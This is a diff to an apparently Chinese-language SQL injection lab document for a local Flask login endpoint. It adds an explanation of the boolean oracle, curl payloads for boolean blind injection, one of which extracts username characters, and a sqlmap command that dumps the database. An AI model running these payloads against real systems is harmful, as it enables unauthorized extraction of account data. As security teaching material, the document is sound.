@@ -206,26 +206,45 @@ row = db.session.execute(
 user = User.query.get(row[0]) if row else None
 ```
 
+**布尔 Oracle 原理**：接口对"用户存在但密码错误"和"用户不存在"返回不同提示，这构成了布尔盲注的判断条件：
+
+| 注入结果 | SQL 是否返回行 | 页面提示 |
+|---------|-------------|---------|
+| 条件为真 | 是 | `密码错误` |
+| 条件为假 | 否 | `账户不存在` |
+
 **手工验证**：
 ```bash
-# 布尔盲注：用户名注入单引号，服务器返回"用户名或密码错误"即可确认
+# 对照：存在的用户 → "密码错误"
 curl -X POST "http://localhost:5000/login" \
-  -d "username=' OR '1'='1&password=wrong"
+  -d "username=zhangsan&password=wrong"
 
-# 联合查询 —— 枚举所有用户名（需配合密码字段响应差异）
+# 对照：不存在的用户 → "账户不存在"
 curl -X POST "http://localhost:5000/login" \
-  -d "username=' UNION SELECT id FROM users WHERE id=1--&password=any"
+  -d "username=no_such_user&password=wrong"
+
+# 布尔注入（真）→ "密码错误"（查询返回了行）
+curl -X POST "http://localhost:5000/login" \
+  -d "username=zhangsan' AND '1'='1&password=wrong"
+
+# 布尔注入（假）→ "账户不存在"（查询未返回行）
+curl -X POST "http://localhost:5000/login" \
+  -d "username=zhangsan' AND '1'='2&password=wrong"
+
+# 字符提取：盲注读第一个用户名的第一个字符
+curl -X POST "http://localhost:5000/login" \
+  -d "username=' OR (SELECT substr(username,1,1) FROM users LIMIT 1)='z'--&password=wrong"
 ```
 
 **sqlmap 扫描命令**：
 ```bash
-# 对登录接口的 username 字段进行扫描
+# --string 告诉 sqlmap 以"密码错误"作为"条件为真"的判断依据
 sqlmap -u "http://localhost:5000/login" \
-  --data="username=test&password=test" \
+  --data="username=zhangsan&password=test" \
   --dbms=sqlite \
   -p username \
-  --level=2 --risk=1 \
-  --technique=BT \
+  --string="密码错误" \
+  --technique=B --level=2 \
   --dump
 ```
 
